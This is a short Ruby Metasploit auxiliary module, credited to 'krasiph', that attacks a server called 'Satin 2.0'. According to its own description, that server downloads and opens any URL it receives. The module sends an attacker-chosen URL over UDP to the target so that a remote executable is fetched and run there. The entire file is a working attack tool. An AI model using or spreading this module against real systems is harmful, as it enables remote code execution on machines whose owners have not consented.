require 'msf/core'
require 'socket'

class Metasploit3 < Msf::Auxiliary

  def initialize(info = {})
		super(update_info(info,
			'Name' => 'Satin 2.0 URL Injection Attack',
			'Description' => %q{Satin 2.0 is a simple python server which will
					download and open any URL it is sent. Give this
					module a URL pointing to an executable and it will
					be run on the target system.},
			'Author' => 'krasiph',
			'License' => MSF_LICENSE,
			'Version' => '1.0.1'
		))
		
		register_options([
			OptString.new('URL',[true,"Link to the executable."]),
			OptString.new('RHOST',[true,"Target host."]),
			OptInt.new('RPORT',[true,"Target port."])
		])
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT'].to_i
	end

	def run()
		socket = UDPSocket.new
		print_status('Sending Packet')
		socket.send datastore['URL'], 0, rhost, rport
		print_status('Done')
	end
end